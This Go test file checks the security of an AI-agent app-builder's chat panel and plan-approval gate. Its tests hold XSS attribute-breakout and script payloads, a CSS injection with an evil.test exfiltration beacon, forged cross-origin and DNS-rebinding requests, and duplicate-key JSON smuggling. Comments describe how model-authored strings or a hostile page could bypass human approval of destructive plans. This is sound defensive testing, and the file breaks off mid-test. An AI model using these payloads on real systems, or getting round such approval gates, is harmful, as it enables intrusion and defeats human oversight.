package chat

import (
	"context"
	"encoding/json"
	"html"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/DonaldMurillo/gofastr/core/render"
	"github.com/DonaldMurillo/gofastr/framework"
	"github.com/DonaldMurillo/gofastr/kiln/db"
	"github.com/DonaldMurillo/gofastr/kiln/journal"
	"github.com/DonaldMurillo/gofastr/kiln/live"
	"github.com/DonaldMurillo/gofastr/kiln/protocol"
	"github.com/DonaldMurillo/gofastr/kiln/world"
	_ "github.com/DonaldMurillo/gofastr/sqlite/stdlib"
)

// Property 1: model-authored plan IDs are attacker-controlled strings, and
// the plan card interpolates them into a SINGLE-quoted attribute
// (data-fui-rpc-body='{"plan_id":"…"}'). escAttr escapes " < > & but not ',
// so a plan_id containing ' breaks out of the attribute and injects real
// attributes onto the Approve/Reject buttons, the exact UI a human uses to
// gate destructive ops. propose_plan accepts any non-empty unique plan_id
// (protocol.go ProposePlan), so nothing upstream bounds the value.
func TestPlanCardAttrBreakoutIsNeutralized(t *testing.T) {
	hostile := []string{
		// attribute breakout with a click handler on the Approve button
		"p' onclick='alert(1)//",
		// hover-fired variant, no click needed
		"p' onmouseover='alert(1)//",
		// focus variant with autofocus chain
		"p' onfocus='alert(1)' autofocus='1",
	}
	for _, planID := range hostile {
		var b strings.Builder
		renderPlanCard(&b, &journal.Plan{
			PlanID:     planID,
			ProposedAt: time.Now(),
			Steps:      []string{"step"},
			Targets:    []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
		}, true)
		out := b.String()
		// Check ATTRIBUTE NAMES, not raw substrings. A bare ' or the text
		// "onclick=" sitting in an element's text content (the plan title
		// echoes the id verbatim) is inert, only a real attribute is the
		// vulnerability, and a substring search cannot tell them apart.
		for _, name := range attrNames(out) {
			if strings.HasPrefix(name, "on") || name == "autofocus" {
				t.Errorf("SECURITY: plan_id %q injected attribute %q into plan card:\n%s", planID, name, out)
			}
		}
	}
	// Happy path: a plan_id with double quotes stays inert, and the
	// rpc-body attribute remains valid JSON carrying the exact id (the
	// runtime json-parses this attribute value to dispatch the RPC).
	var b strings.Builder
	renderPlanCard(&b, &journal.Plan{PlanID: `p" onclick="alert(1)`, ProposedAt: time.Now()}, true)
	out := b.String()
	const marker = `data-fui-rpc-body='`
	_, after, ok := strings.Cut(out, marker)
	if !ok {
		t.Fatalf("rpc-body attribute missing:\n%s", out)
	}
	rest := after
	end := strings.Index(rest, `'`)
	if end < 0 {
		t.Fatalf("unterminated rpc-body attribute:\n%s", out)
	}
	var body struct {
		PlanID string `json:"plan_id"`
	}
	// HTML-unescape first: the browser decodes entity references before the
	// runtime's JSON.parse ever sees the attribute value, so decoding here
	// is what models the real consumer. Parsing the raw source text would
	// fail on correctly-escaped markup.
	decoded := html.UnescapeString(rest[:end])
	if err := json.Unmarshal([]byte(decoded), &body); err != nil {
		t.Errorf("rpc-body is not valid JSON (%v):\n%s", err, decoded)
	} else if body.PlanID != `p" onclick="alert(1)` {
		t.Errorf("rpc-body plan_id = %q, want exact round-trip", body.PlanID)
	}
}

// attrNames returns every attribute name appearing in an HTML fragment.
//
// It is a deliberately small scanner rather than a full parser: it tracks
// whether it is inside a tag and skips over quoted attribute VALUES, so
// payload text that is correctly escaped inside a value can never be
// misread as an attribute name. That skipping is exactly the property
// under test. If escaping regresses, the injected name becomes visible
// here.
func attrNames(doc string) []string {
	var names []string
	for i := 0; i < len(doc); i++ {
		if doc[i] != '<' {
			continue
		}
		i++
		for i < len(doc) && doc[i] != '>' {
			switch {
			case doc[i] == '"' || doc[i] == '\'':
				q := doc[i]
				i++
				for i < len(doc) && doc[i] != q {
					i++
				}
				i++
			case isAttrNameByte(doc[i]):
				start := i
				for i < len(doc) && isAttrNameByte(doc[i]) {
					i++
				}
				if i < len(doc) && doc[i] == '=' {
					names = append(names, strings.ToLower(doc[start:i]))
				}
			default:
				i++
			}
		}
	}
	return names
}

func isAttrNameByte(c byte) bool {
	return c == '-' || c == '_' || c == ':' ||
		(c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
}

// Property 2: theme values are agent-authored (set_theme) and land in CSS
// custom-property declarations that core-ui/style emits unescaped. The
// /__gofastr/app.css path guards this with kiln/render's safeThemeValue;
// the /kiln/theme.css path (applyAppOverrides) must not be a bypass.
func TestThemeCSSRejectsDeclarationBreakout(t *testing.T) {
	hostile := []string{
		// close the :root block and pull in attacker CSS
		"red;} @import url(//evil.test/x.css); :root{--x:0",
		// exfil beacon as a background fetch
		"red; background:url(//evil.test/ping)",
	}
	for _, v := range hostile {
		css := pageCSSFor(&world.AppConfig{Theme: map[string]string{"primary": v}})
		for _, marker := range []string{"@import", "url(//evil.test"} {
			if strings.Contains(css, marker) {
				t.Errorf("SECURITY: theme value %q smuggled %q into /kiln/theme.css output:\n%.400s", v, marker, css)
			}
		}
	}
	// Happy path: a plain color literal still resolves to the override.
	css := pageCSSFor(&world.AppConfig{Theme: map[string]string{"primary": "#22D3EE"}})
	if !strings.Contains(css, "#22D3EE") {
		t.Errorf("legit color override dropped from theme CSS:\n%.400s", css)
	}
}

// Property 3: world credentials (App.Auth.JWTSecret, App.Admin.SeedPassword)
// are masked on every endpoint that emits the world or app config.
// /kiln/world redacts (redactedWorld); /kiln/status?fields=world|app must
// not be a bypass.
func TestStatusDoesNotLeakWorldSecrets(t *testing.T) {
	d, cleanup, err := db.EphemeralSQLite("kiln-sec")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(cleanup)
	factory := func() *framework.App { return framework.NewApp(framework.WithDB(d)) }
	l, err := live.New(journal.NewMemory(), factory)
	if err != nil {
		t.Fatal(err)
	}
	tools := protocol.New(l)
	res := tools.SetAppConfig(context.Background(), protocol.SetAppConfigArgs{
		Config: world.AppConfig{
			Name: "sec-test",
			Auth: world.AuthConfig{Enabled: true, DevMode: true, JWTSecret: "jwt-canary-0123456789"},
			Admin: world.AdminConfig{
				Enabled: true, SeedEmail: "root@example.test", SeedPassword: "seed-canary-0123456789", // not-a-secret: canary the assertions grep for, proving the endpoint redacted it
			},
		},
	})
	if !res.OK {
		t.Fatalf("SetAppConfig: %+v", res)
	}

	srv := New(l, tools)
	for _, fields := range []string{"world", "app", "world,app"} {
		req := httptest.NewRequest(http.MethodGet, "/kiln/status?fields="+fields, nil)
		rec := httptest.NewRecorder()
		srv.serveStatus(rec, req)
		body := rec.Body.String()
		for _, canary := range []string{"jwt-canary-0123456789", "seed-canary-0123456789"} {
			if strings.Contains(body, canary) {
				t.Errorf("SECURITY: /kiln/status?fields=%s leaked %q:\n%.600s", fields, canary, body)
			}
		}
	}

	// Contrast surface: /kiln/world must stay redacted too (pins the
	// existing contract the new test defends).
	req := httptest.NewRequest(http.MethodGet, "/kiln/world", nil)
	rec := httptest.NewRecorder()
	srv.serveWorld(rec, req)
	if strings.Contains(rec.Body.String(), "jwt-canary-0123456789") {
		t.Errorf("/kiln/world leaked the JWT secret:\n%.600s", rec.Body.String())
	}
}

// Property 4: no caller-supplied header chooses the base URL substituted
// into the fallback host page, and whatever is substituted is HTML-escaped.
//
// The base lands inside <code>curl … __KILN_BASE__/kiln/tool/…</code> as
// raw text. X-Forwarded-* used to select it, which gave a header direct
// reach into the document; kiln binds loopback and is served directly, so
// nothing legitimately sets those headers and the trust was unearned. The
// host now comes from r.Host (pinned by the listener, see
// rebind_security_test.go) and is escaped on the way out.
func TestHostBaseIgnoresForwardedHeaders(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/anything", nil)
	req.Host = "localhost:8765"
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Host", "h.example</code><script>alert(1)</script>")
	html := HostHTMLForRequest(req)
	if strings.Contains(html, "<script>alert(1)</script>") {
		t.Errorf("SECURITY: X-Forwarded-Host reached the host page:\n%.600s", html)
	}
	if strings.Contains(html, "h.example") {
		t.Errorf("SECURITY: X-Forwarded-Host still selects the base URL:\n%.600s", html)
	}
	// The pinned Host, not the forwarded one, is what renders.
	if !strings.Contains(html, "http://localhost:8765/kiln/tool/add_entity") {
		t.Errorf("base URL not built from r.Host:\n%.600s", html)
	}
}

// Escaping is asserted independently of the header question: r.Host is
// pinned, but it is still request-derived text landing in HTML, so the
// substitution must escape rather than rely on the pin alone.
func TestHostBaseEscapesHost(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/anything", nil)
	req.Host = "h.example</code><script>alert(1)</script>"
	if html := HostHTMLForRequest(req); strings.Contains(html, "<script>alert(1)</script>") {
		t.Errorf("SECURITY: Host reflected unescaped into host page:\n%.600s", html)
	}
}

// Property 5: chat-log text interpolates model- and user-authored
// strings through escHTML, which was a 3-char escaper (no quotes).
// A text node can't break out with ' alone, but maintaining two escaper
// shapes in one file is exactly the drift that produced the plan-card
// bug above, pin the 5-char contract on the text path too.
func TestChatTextEscapesApostrophes(t *testing.T) {
	var b strings.Builder
	renderChatEvent(&b, &journal.ChatEvent{
		Timestamp: time.Now(),
		Kind:      journal.KindChatUser,
		Message:   &journal.ChatMessagePayload{Text: "it's alive"},
	}, nil, nil)
	out := b.String()
	if !strings.Contains(out, "it&#39;s alive") {
		t.Errorf("chat message text must entity-escape the apostrophe:\n%s", out)
	}
	if strings.Contains(out, "it's alive") {
		t.Errorf("chat message text leaked a raw apostrophe:\n%s", out)
	}
}

// newCSRFTestServer builds a live runtime with both state-changing
// surfaces mounted the way cmd/kiln wires them: the tool dispatcher +
// chat endpoint (Server.Mount) and the panel RPC routes (MountPanel),
// all on the aux router behind l.ServeHTTP.
func newCSRFTestServer(t *testing.T) (*live.Live, *protocol.Tools) {
	t.Helper()
	d, cleanup, err := db.EphemeralSQLite("kiln-csrf")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(cleanup)
	factory := func() *framework.App { return framework.NewApp(framework.WithDB(d)) }
	l, err := live.New(journal.NewMemory(), factory)
	if err != nil {
		t.Fatal(err)
	}
	tools := protocol.New(l)
	srv := New(l, tools)
	srv.Mount(l.Aux())
	MountPanel(l.Aux(), l, tools, nil)
	return l, tools
}

// csrfPost issues a no-preflight cross-site POST: a browser on
// https://evil.example can send this fetch() without any CORS
// preflight (text/plain is a simple content type), and the request's
// Host is a legitimate localhost:8765, so neither the loopback bind
// nor Host pinning stops it.
func csrfPost(t *testing.T, l *live.Live, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "http://localhost:8765"+path, strings.NewReader(body))
	req.Header.Set("Origin", "https://evil.example")
	req.Header.Set("Content-Type", "text/plain")
	rec := httptest.NewRecorder()
	l.ServeHTTP(rec, req)
	return rec
}

// Property 6: state-changing loopback endpoints must reject cross-site
// browser requests. The plan-gate's human approval is the security leg
// CSRF defeats: a webpage the operator visits can silently POST to
// /kiln/tool/approve_plan (or the panel's approve_plan) and approve a
// destructive plan without the human ever seeing the card.
//
// This does NOT contradict the plan_gate_test.go testimonial ("the
// transport is deliberately unauthenticated; loopback bind is the
// boundary; agent self-approval is intended"): an Origin allow-list
// leaves every non-browser caller untouched — the agent's $KILN_URL
// client and curl send no Origin header at all — and the operator's
// panel is same-origin. The one caller class it rejects is exactly the
// class the loopback bind cannot see: a browser tab whose TCP peer is
// the operator's own machine.
func TestPOSTRoutesRejectCrossOrigin(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	routes := []struct{ path, body string }{
		{"/kiln/tool/approve_plan", `{"plan_id":"p1"}`},
		{"/kiln/tool/reject_plan", `{"plan_id":"p1","reason":"x"}`},
		{"/kiln/tool/reset_session", `{}`},
		{"/kiln/tool/undo", `{}`},
		{"/kiln/chat/message", `{"role":"user","text":"pwn"}`},
		{"/kiln/panel/approve_plan", `{"plan_id":"p1"}`},
		{"/kiln/panel/reject_plan", `{"plan_id":"p1"}`},
		{"/kiln/panel/reset", `{}`},
		{"/kiln/panel/undo", `{}`},
		{"/kiln/panel/send", `{"text":"pwn"}`},
	}
	for _, r := range routes {
		rec := csrfPost(t, l, r.path, r.body)
		if rec.Code != http.StatusForbidden {
			t.Errorf("SECURITY: %s accepted a cross-origin POST (Origin: https://evil.example): status %d, body %.200s",
				r.path, rec.Code, rec.Body.String())
		}
	}
}

// The end-to-end damage pin: a proposed plan must survive a cross-site
// approve attempt still pending. The panel is where a human eyeballs a
// destructive intent; CSRF on the approve route makes that gate
// decorative.
func TestCrossOriginApproveLeavesPlanPending(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	ctx := context.Background()
	if res := tools.ProposePlan(ctx, protocol.ProposePlanArgs{
		PlanID: "p1", Steps: []string{"drop posts"},
		Targets: []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
	}); !res.OK {
		t.Fatalf("propose_plan: %+v", res)
	}

	rec := csrfPost(t, l, "/kiln/tool/approve_plan", `{"plan_id":"p1"}`)
	if rec.Code != http.StatusForbidden {
		t.Errorf("cross-origin approve_plan status = %d, want 403", rec.Code)
	}

	var approved bool
	l.ReadSession(func(sess *journal.Session) {
		if p, ok := sess.Plans["p1"]; ok {
			approved = p.Approved
		}
	})
	if approved {
		t.Errorf("SECURITY: cross-origin POST approved plan p1; the human gate was bypassed (status %d, body %.200s)",
			rec.Code, rec.Body.String())
	}
}

// Contract guard for the fix: requests with no Origin header are the
// agent transport (curl / $KILN_URL client), the exact caller class
// plan_gate_test.go pins as intended. An Origin gate must leave them
// working, including self-approval.
func TestNoOriginApproveStillWorks(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	ctx := context.Background()
	if res := tools.ProposePlan(ctx, protocol.ProposePlanArgs{
		PlanID: "p2", Steps: []string{"drop posts"},
		Targets: []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
	}); !res.OK {
		t.Fatalf("propose_plan: %+v", res)
	}

	req := httptest.NewRequest(http.MethodPost, "http://localhost:8765/kiln/tool/approve_plan",
		strings.NewReader(`{"plan_id":"p2"}`))
	rec := httptest.NewRecorder()
	l.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("no-Origin approve_plan (agent transport) status = %d, want 200: %.200s", rec.Code, rec.Body.String())
	}
	var approved bool
	l.ReadSession(func(sess *journal.Session) {
		if p, ok := sess.Plans["p2"]; ok {
			approved = p.Approved
		}
	})
	if !approved {
		t.Errorf("no-Origin approve_plan did not approve p2; the agent transport contract (plan_gate_test.go) is broken: %.200s", rec.Body.String())
	}
}

// Property 7: every agent-authored world identifier interpolated into
// the panel chrome is escaped at its sink. The plan card and chat rows
// are pinned above; the snapshot pill, its tooltip attribute, and the
// quickstart tray are the remaining sinks for world names and page
// paths, which add_page accepts as arbitrary non-dynamic strings.
func TestPanelWorldNamesStayEscaped(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	const hostilePath = `/p" onmouseover="alert(1)"><img src=x onerror=alert(2)>`
	res := tools.AddPage(context.Background(), protocol.AddPageArgs{
		Page: &world.Page{Path: hostilePath, Tree: world.Node{Kind: "div"}},
	})
	if !res.OK {
		t.Fatalf("add_page with a quote-carrying static path failed: %+v (hint: %s)", res, res.Hint)
	}
	pe := &panelEnv{live: l, tools: tools}
	// The header's snapshot pill text and its tooltip attribute are the
	// two sinks for world identifiers; the tooltip is where page paths
	// land (worldSnapshotTooltipLocked lists every page).
	doc := pe.headerHTML()
	if strings.Contains(doc, `onmouseover="alert(1)"`) {
		t.Errorf("SECURITY: page path broke out into an attribute:\n%s", doc)
	}
	if strings.Contains(doc, "<img src=x onerror") {
		t.Errorf("SECURITY: page path injected live markup:\n%s", doc)
	}
	if want := render.Escape(hostilePath); !strings.Contains(doc, want) {
		t.Errorf("hostile path no longer round-trips escaped (render.Escape); tooltip dropped it.\nwant fragment %q in:\n%.600s", want, doc)
	}
}

// Property 8: chat message text never breaks out of its row — neither
// the body nor the [page=…] chip the widget prepends. The message is
// fully attacker-chosen (POST /kiln/panel/send, /kiln/chat/message), and
// the log is inserted via innerHTML, so escaping is the only barrier.
func TestChatRowInjectionNeutralized(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	messages := []string{
		`[page=/"><img src=x onerror=alert(1)>] </li><li>injected row`,
		`</ol><script>alert(2)</script>`,
		`[page=/x] <b>bold</b> & "quoted" 'apostrophe'`,
	}
	for _, msg := range messages {
		res := tools.Chat(context.Background(), protocol.ChatArgs{Role: "user", Text: msg})
		if !res.OK {
			t.Fatalf("chat %q rejected: %+v", msg, res)
		}
	}
	pe := &panelEnv{live: l, tools: tools}
	doc := pe.logHTMLForCurrent()
	for _, raw := range []string{
		"<img src=x onerror", "<script>", "</ol><script", "<li>injected row",
	} {
		if strings.Contains(doc, raw) {
			t.Errorf("SECURITY: chat message leaked %q into the log unescaped:\n%s", raw, doc)
		}
	}
	// The text still renders (escaped), chip included.
	if !strings.Contains(doc, "&lt;b&gt;bold&lt;/b&gt;") {
		t.Errorf("message body no longer round-trips escaped:\n%.400s", doc)
	}
	if !strings.Contains(doc, `kiln-msg-page`) {
		t.Errorf("page chip disappeared for a prefixed message:\n%.400s", doc)
	}
}

// Property 9: plan text fields (reason, steps, reject reason) stay
// escaped. The plan card's attribute surfaces are pinned by Property 1;
// these are the text sinks of the same card, and the reject reason is
// operator-visible context for a destructive op.
func TestPlanCardTextFieldsStayEscaped(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	res := tools.ProposePlan(context.Background(), protocol.ProposePlanArgs{
		PlanID: "plan-text",
		Reason: `<b>because</b> <img src=x onerror=alert(1)>`,
		Steps: []string{
			`</li><li>fake step<img src=x onerror=alert(2)>`,
			`legitimate step`,
		},
	})
	if !res.OK {
		t.Fatalf("propose_plan rejected: %+v (hint: %s)", res, res.Hint)
	}
	pe := &panelEnv{live: l, tools: tools}
	doc := pe.logHTMLForCurrent()
	for _, raw := range []string{"<b>because</b>", "<img src=x onerror", "<li>fake step"} {
		if strings.Contains(doc, raw) {
			t.Errorf("SECURITY: plan text leaked %q unescaped into the card:\n%s", raw, doc)
		}
	}
	if !strings.Contains(doc, "legitimate step") {
		t.Error("legitimate plan step dropped")
	}
	// The rejected variant renders the operator-given reject reason.
	if res := tools.RejectPlan(context.Background(), protocol.RejectPlanArgs{
		PlanID: "plan-text", Reason: `</div><script>alert(3)</script>`,
	}); !res.OK {
		t.Fatalf("reject_plan: %+v", res)
	}
	doc = pe.logHTMLForCurrent()
	if strings.Contains(doc, "<script>") {
		t.Errorf("SECURITY: reject reason leaked unescaped:\n%s", doc)
	}
}

// Property 10: the tool dispatch surface is a closed catalog. A tool
// name the switch does not know is a 400 naming the tool, never a
// wildcard match, a panic, or a silently-empty success.
func TestDispatchUnknownToolIs400(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	for _, name := range []string{"system.exec", "Approve_Plan", "__del__"} {
		req := httptest.NewRequest(http.MethodPost, "http://localhost:8765/kiln/tool/"+name, strings.NewReader(`{}`))
		rec := httptest.NewRecorder()
		l.ServeHTTP(rec, req)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("unknown tool %q: status = %d (%.200s), want 400", name, rec.Code, rec.Body.String())
		}
		if !strings.Contains(rec.Body.String(), "unknown tool") {
			t.Errorf("unknown tool %q: response does not name the problem: %.200s", name, rec.Body.String())
		}
	}
}

// Property 11: every inbound kiln body is capped before buffering.
// The tool dispatcher and the panel RPCs wrap r.Body in MaxBytesReader;
// a body past the cap is refused (or silently dropped for the ack-only
// panel path) without ever being fully read into memory.
func TestToolBodyCapEnforced(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	// Tool dispatcher: 5 MB against a 4 MB cap.
	oversize := `{"text": "` + strings.Repeat("a", 5<<20) + `"}`
	req := httptest.NewRequest(http.MethodPost, "http://localhost:8765/kiln/tool/chat", strings.NewReader(oversize))
	rec := httptest.NewRecorder()
	l.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("oversize tool body: status = %d, want 400", rec.Code)
	}
	// Panel send: 2 MB against a 1 MB cap; the handler acks rather than
	// 4xx-ing, but the message must NOT be journaled.
	before := chatCount(l)
	req = httptest.NewRequest(http.MethodPost, "http://localhost:8765/kiln/panel/send", strings.NewReader(oversize))
	rec = httptest.NewRecorder()
	l.ServeHTTP(rec, req)
	if rec.Code >= 500 {
		t.Errorf("oversize panel send: status = %d, want an ack", rec.Code)
	}
	if after := chatCount(l); after != before {
		t.Errorf("oversize panel send journaled a message anyway: %d -> %d chat events", before, after)
	}
}

func chatCount(l *live.Live) int {
	n := 0
	l.ReadSession(func(sess *journal.Session) { n = len(sess.Chat) })
	return n
}

// Property: the world-disclosing GET surfaces must refuse a cross-site
// or rebound browser subscriber.
//
// Mount wraps every state-changing POST in sameOriginOnly but registers
// the read half bare: /kiln/world (whole in-memory IR), /kiln/status,
// and the /.kiln/events stream (every entry, op and summary as it
// happens). A plain cross-origin fetch cannot read those bodies without
// CORS, but DNS rebinding needs no CORS: after the rebind the
// attacker's page is same-origin (Origin agrees with the attacker-named
// Host), so both checks sameOriginOnly would apply pass. The framework
// learned this exact lesson for its own SSE half — core/mcp's
// sseGetHandler now enforces the origin/Host gate because "without it
// the stream is a cross-origin read" (origin_security_test.go) — and
// cmd/kiln's outer originGuard covers only its own process. chat.Mount
// is a library surface; the POST family here already carries its own
// guard, the GET family must too.
func TestReadRoutesRefuseCrossSiteSub(t *testing.T) {
	l, _ := newCSRFTestServer(t)

	cases := []struct {
		name   string
		origin string
		host   string
	}{
		{"cross-site Origin", "http://evil.example", "localhost:8765"},
		{"rebound Host with matching Origin", "http://evil.test:8765", "evil.test:8765"},
		{"Origin null (sandboxed frame)", "null", "localhost:8765"},
	}
	surfaces := []string{"/kiln/world", "/kiln/status", "/.kiln/events"}

	get := func(t *testing.T, path, origin, host string) *httptest.ResponseRecorder {
		t.Helper()
		ctx, cancel := context.WithCancel(context.Background())
		go func() {
			time.Sleep(500 * time.Millisecond)
			cancel()
		}()
		req := httptest.NewRequest(http.MethodGet, path, nil).WithContext(ctx)
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		req.Host = host
		rec := httptest.NewRecorder()
		l.ServeHTTP(rec, req)
		return rec
	}

	for _, surface := range surfaces {
		for _, tc := range cases {
			t.Run(tc.name+" on "+surface, func(t *testing.T) {
				rec := get(t, surface, tc.origin, tc.host)
				if rec.Code != http.StatusForbidden {
					t.Errorf("SECURITY: %s with %s (Host %s) got status %d and streamed %q.\n"+
						"The route discloses the live world; under DNS rebinding the subscriber is same-origin\n"+
						"with the listener and reads the whole IR / edit stream. The POST family beside it is\n"+
						"sameOriginOnly-wrapped; the framework's SSE half applies its own origin/Host gate\n"+
						"(core/mcp sseGetHandler).",
						surface, tc.origin, tc.host, rec.Code, strings.TrimSpace(rec.Body.String()))
				}
			})
		}
	}

	// Contract guards: the non-browser transport (no Origin at all) and
	// the operator's own panel (same-origin) keep working, exactly as
	// the POST family's guard promises (plan_gate_test.go pins the
	// unauthenticated transport as intended).
	t.Run("no-Origin GET still works", func(t *testing.T) {
		if rec := get(t, "/kiln/world", "", "localhost:8765"); rec.Code != http.StatusOK {
			t.Errorf("no-Origin GET /kiln/world (curl / agent transport) got %d, want 200", rec.Code)
		}
	})
	t.Run("same-origin GET still works", func(t *testing.T) {
		if rec := get(t, "/kiln/world", "http://localhost:8765", "localhost:8765"); rec.Code != http.StatusOK {
			t.Errorf("same-origin GET /kiln/world (operator panel) got %d, want 200", rec.Code)
		}
	})
}

// --- Strict body decoding on the panel + tool surfaces -----------------
//
// Property family: a JSON-body RPC surface must either decode its body
// or refuse the request (400) — never ack an operation whose arguments
// it never read, and never resolve a duplicate or case-folded key
// last-wins.

// localJSONPost drives a loopback RPC the way the agent transport does:
// same host, no Origin header (sameOriginOnly passes those). The body
// is sent verbatim.
func localJSONPost(t *testing.T, l *live.Live, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "http://localhost:8765"+path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	l.ServeHTTP(rec, req)
	return rec
}

// panelStrictRefusals runs the two refusal shapes (a body that fails to
// parse, and a duplicate key that must not last-wins) against one panel
// surface.
func panelStrictRefusals(t *testing.T, l *live.Live, cases []struct {
	name string
	path string
	body string
}) {
	t.Helper()
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			rec := localJSONPost(t, l, c.path, c.body)
			if rec.Code != http.StatusBadRequest {
				t.Errorf("POST %s with body %.60q was acked %d %q — the handler proceeded without a decoded body; want 400", c.path, c.body, rec.Code, rec.Body.String())
			}
		})
	}
}

// planApproved reads one plan's state under the session read lock.
func planApproved(l *live.Live, id string) bool {
	var approved bool
	l.ReadSession(func(sess *journal.Session) {
		if p, ok := sess.Plans[id]; ok {
			approved = p.Approved
		}
	})
	return approved
}

func TestPanelSendRejectsMalformed(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	panelStrictRefusals(t, l, []struct {
		name string
		path string
		body string
	}{
		{"send malformed", "/kiln/panel/send", `{"text":"drop the posts`},
	})
}

func TestPanelSendRejectsDuplicateKeys(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	panelStrictRefusals(t, l, []struct {
		name string
		path string
		body string
	}{
		{"send duplicate key", "/kiln/panel/send", `{"text":"visible","text":"hidden"}`},
	})
}

func TestPanelApproveRejectsMalformed(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	ctx := context.Background()
	if res := tools.ProposePlan(ctx, protocol.ProposePlanArgs{
		PlanID:  "strict-a",
		Steps:   []string{"drop posts"},
		Targets: []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
	}); !res.OK {
		t.Fatalf("propose_plan strict-a: %+v", res)
	}
	panelStrictRefusals(t, l, []struct {
		name string
		path string
		body string
	}{
		{"approve malformed", "/kiln/panel/approve_plan", `{"plan_id":"strict-a`},
	})
}

// TestPanelApproveRejectsDuplicateKeys carries the damage pin: under
// last-wins, a duplicate-key body approved plan strict-b while the
// first occurrence named strict-a. The plan gate is a human-approval
// control; strict-b must stay pending.
func TestPanelApproveRejectsDuplicateKeys(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	ctx := context.Background()
	for _, id := range []string{"strict-a", "strict-b"} {
		if res := tools.ProposePlan(ctx, protocol.ProposePlanArgs{
			PlanID:  id,
			Steps:   []string{"drop posts"},
			Targets: []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
		}); !res.OK {
			t.Fatalf("propose_plan %s: %+v", id, res)
		}
	}
	panelStrictRefusals(t, l, []struct {
		name string
		path string
		body string
	}{
		{"approve duplicate key", "/kiln/panel/approve_plan", `{"plan_id":"strict-a","plan_id":"strict-b"}`},
	})

	if planApproved(l, "strict-b") {
		t.Errorf("duplicate-key approve_plan approved plan strict-b (last-wins); the human gate read strict-a")
	}
}

func TestPanelRejectPlanRejectsMalformed(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	ctx := context.Background()
	if res := tools.ProposePlan(ctx, protocol.ProposePlanArgs{
		PlanID:  "strict-a",
		Steps:   []string{"drop posts"},
		Targets: []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
	}); !res.OK {
		t.Fatalf("propose_plan strict-a: %+v", res)
	}
	panelStrictRefusals(t, l, []struct {
		name string
		path string
		body string
	}{
		{"reject malformed", "/kiln/panel/reject_plan", `{"plan_id":"strict-a","reason":"x`},
	})
}

func TestPanelRejectPlanRejectsDuplicateKeys(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	ctx := context.Background()
	if res := tools.ProposePlan(ctx, protocol.ProposePlanArgs{
		PlanID:  "strict-a",
		Steps:   []string{"drop posts"},
		Targets: []journal.PlanTarget{{Op: "delete_entity", Name: "posts"}},
	}); !res.OK {
		t.Fatalf("propose_plan strict-a: %+v", res)
	}
	panelStrictRefusals(t, l, []struct {
		name string
		path string
		body string
	}{
		{"reject duplicate reason", "/kiln/panel/reject_plan", `{"plan_id":"strict-a","reason":"first","reason":"second"}`},
	})
}

func TestChatMessageRejectsDuplicateKeys(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	rec := localJSONPost(t, l, "/kiln/chat/message", `{"role":"user","text":"first","text":"second"}`)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("/kiln/chat/message accepted duplicate-key body (encoding/json resolves it last-wins): status %d, body %.200s — want 400", rec.Code, rec.Body.String())
	}
}

// TestChatMessageRejectsCaseFoldedKeys: "Text"/"text" fold onto the
// same field via stdlib json's tag-insensitive match — a duplicate
// modulo folding; survives a dedup-only fix.
func TestChatMessageRejectsCaseFoldedKeys(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	rec := localJSONPost(t, l, "/kiln/chat/message", `{"role":"user","Text":"first","text":"second"}`)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("/kiln/chat/message accepted case-folded-key body (encoding/json resolves it last-wins): status %d, body %.200s — want 400", rec.Code, rec.Body.String())
	}
}

func TestToolDispatchRejectsDuplicateKeys(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	rec := localJSONPost(t, l, "/kiln/tool/add_entity", `{"entity":{"name":"dupSafe","fields":[]},"entity":{"name":"dupEvil","fields":[]}}`)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("/kiln/tool/add_entity accepted duplicate-key body (encoding/json resolves it last-wins and the tool runs on the second value): status %d, body %.200s — want 400", rec.Code, rec.Body.String())
	}
}

func TestToolDispatchRejectsCaseFoldedKeys(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	rec := localJSONPost(t, l, "/kiln/tool/add_entity", `{"Entity":{"name":"foldSafe","fields":[]},"entity":{"name":"foldEvil","fields":[]}}`)
	if rec.Code != http.StatusBadRequest {
